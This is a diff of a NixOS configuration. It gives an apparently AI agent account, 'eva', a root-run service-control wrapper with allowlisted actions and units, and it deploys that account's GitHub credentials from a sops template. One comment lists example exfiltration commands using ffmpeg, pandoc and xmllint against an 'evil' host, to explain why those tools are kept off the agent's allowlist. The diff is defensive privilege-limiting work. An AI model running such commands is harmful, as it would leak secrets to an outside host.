@@ -30,14 +30,27 @@ let
     domain = "acpuchades.com";
   };
 
-  # Units eva manages: exactly the set whose failures page her
-  # (my.ntfy-alert.failureUnits) plus her own service. Drives BOTH grants
-  # below — the per-unit `systemctl restart` sudo entries and the journal
-  # wrapper's read allowlist — so the two can never drift apart.
+  # Fugazi deployment-tick services — baked in at build time so the restart
+  # wrapper and the sudoers rules reference exactly the same set.
+  fugaziTickUnits = [
+    "fugazi-web-testing-deployment-tick-1m"
+    "fugazi-web-testing-deployment-tick-3m"
+    "fugazi-web-testing-deployment-tick-5m"
+  ];
+
+  # Units eva manages: her own service, operational units she needs to
+  # restart or diagnose (nominatim, fugazi ticks), and any that page her
+  # (my.ntfy-alert.failureUnits). Drives BOTH grants below — the per-unit
+  # `systemctl restart` sudo entries and the journal wrapper's read allowlist —
+  # so the two can never drift apart.
   evaManagedUnits = lib.unique (
-    [ "openclaw-eva" ]
+    [
+      "openclaw-eva"
+      "nominatim-update"
+    ]
     # `or false`: a host without these modules simply grants fewer units.
     ++ lib.optionals (config.my.ntfy-alert.enable or false) config.my.ntfy-alert.failureUnits
+    ++ fugaziTickUnits
   );
 
   # Root-run journal reader for the managed units, replacing eva's old
@@ -147,6 +160,35 @@ let
         --argjson prometheus "$prom" --argjson ssh "$ssh" --argjson auth "$auth" \
         '{host: $host, generated_at: $at, window: "24h",
           prometheus: $prometheus, ssh: $ssh, auth: $auth}'
+    '';
+  };
+
+  # General-purpose service management wrapper. Validates both the action and
+  # the unit against baked-in allowlists before invoking systemctl as root.
+  # Eva calls: sudo service-ctl <action> <unit>  (no .service suffix)
+  # Pattern mirrors eva-journal: sudoers entry on the script itself, no
+  # per-command granularity needed — internal validation is the gate.
+  serviceCtl = pkgs.writeShellApplication {
+    name = "service-ctl";
+    text = ''
+      action="''${1:?usage: service-ctl <action> <unit>}"
+      unit="''${2:?usage: service-ctl <action> <unit>}"
+
+      allowed_actions=" restart start stop reload "
+      case "$allowed_actions" in
+        *" $action "*) ;;
+        *) echo "service-ctl: '$action' is not an allowed action (restart start stop reload)" >&2
+           exit 1 ;;
+      esac
+
+      allowed=" ${toString evaManagedUnits} "
+      case "$allowed" in
+        *" $unit "*) ;;
+        *) echo "service-ctl: '$unit' is not in the managed unit allowlist" >&2
+           exit 1 ;;
+      esac
+
+      exec /run/current-system/sw/bin/systemctl "$action" "$unit.service"
     '';
   };
 
@@ -276,6 +318,39 @@ in
       GIT_CONFIG_COUNT=1
       GIT_CONFIG_KEY_0=credential.https://github.com.helper
       GIT_CONFIG_VALUE_0=!gh auth git-credential
+    '';
+  };
+
+  # gh hosts.yml — rendered by sops, copied to Eva's home on every activation.
+  # Keeps `gh auth status` happy even without GH_TOKEN in the environment
+  # (interactive shells, cron jobs outside OpenClaw).
+  sops.templates."gh/eva-hosts.yml" = {
+    mode = "0440";
+    owner = "eva";
+    content = ''
+      github.com:
+          users:
+              eva-nebot:
+                  oauth_token: ${config.sops.placeholder."openclaw/eva/github-token"}
+          oauth_token: ${config.sops.placeholder."openclaw/eva/github-token"}
+          user: eva-nebot
+    '';
+  };
+
+  systemd.services.eva-write-gh-hosts = {
+    description = "Write Eva's gh hosts.yml from sops template";
+    after = [ "sops-install-secrets.service" ];
+    wantedBy = [ "multi-user.target" ];
+    serviceConfig = {
+      Type = "oneshot";
+      RemainAfterExit = true;
+      User = "eva";
+    };
+    script = ''
+      mkdir -p /home/eva/.config/gh
+      install -C -m 600 \
+        ${config.sops.templates."gh/eva-hosts.yml".path} \
+        /home/eva/.config/gh/hosts.yml
     '';
   };
 
@@ -475,6 +550,12 @@ in
         }- `sudo ${lib.getExe evaJournal} <unit> [lines]` — the journal of one of
           the units you manage (${lib.concatStringsSep ", " evaManagedUnits}),
           without the `.service` suffix.
+        - `sudo ${lib.getExe serviceCtl} <action> <unit>` — general service
+          manager. Allowed actions: restart start stop reload. Allowed units
+          (same set as eva-journal): ${lib.concatStringsSep ", " evaManagedUnits}.
+          No `.service` suffix. Examples:
+            sudo ${lib.getExe serviceCtl} restart nominatim-update
+            sudo ${lib.getExe serviceCtl} restart fugazi-web-testing-deployment-tick-1m
 
         You are NOT in the systemd-journal group: a plain `journalctl` shows
         only your own logs. Use these wrappers instead of trying to widen that.
@@ -904,6 +985,10 @@ in
         # the whole capability. Like the rest of this list it is inert under
         # claude-cli; the real gate is the argument-less sudoers entry.
         "server-health-check"
+        # General service manager: `sudo service-ctl <action> <unit>`.
+        # Allowed actions and units are baked in at build time; the real gate
+        # is the sudoers entry on the script itself.
+        "service-ctl"
         # ffmpeg/ffprobe/pandoc/xmllint are network-capable — `ffmpeg -i
         # http://evil/<secret>`, `pandoc https://evil/<secret>` (or its
         # --lua-filter RCE), `xmllint http://evil/<secret>` — so they are NOT
@@ -1231,8 +1316,23 @@ in
     # Paths are the NixOS profile symlinks `sudo` resolves. This is the single
     # source of truth for eva's sudo access.
     sudoCommands =
-      map (u: "/run/current-system/sw/bin/systemctl restart ${u}.service") evaManagedUnits
-      ++ [ (lib.getExe evaJournal) ]
+      # Per-unit restart grants are kept for the units eva OWNS (openclaw-eva)
+      # and any that page her (ntfy-alert.failureUnits). General service admin
+      # for the full evaManagedUnits set goes through service-ctl instead.
+      map (u: "/run/current-system/sw/bin/systemctl restart ${u}.service") (
+        lib.filter (
+          u:
+          u == "openclaw-eva"
+          || (config.my.ntfy-alert.enable or false && builtins.elem u config.my.ntfy-alert.failureUnits)
+        ) evaManagedUnits
+      )
+      ++ [
+        (lib.getExe evaJournal)
+        # General service manager: `sudo service-ctl <action> <unit>`.
+        # Actions: restart start stop reload. Units: evaManagedUnits allowlist.
+        # Sudoers entry is on the script itself; validation is internal.
+        (lib.getExe serviceCtl)
+      ]
       # Only where Prometheus runs (it queries server-stats' instance).
       # `""` = no arguments allowed (the script refuses them anyway).
       ++ lib.optional (config.my.server-stats.enable or false) "${lib.getExe serverHealthCheck} \"\"";
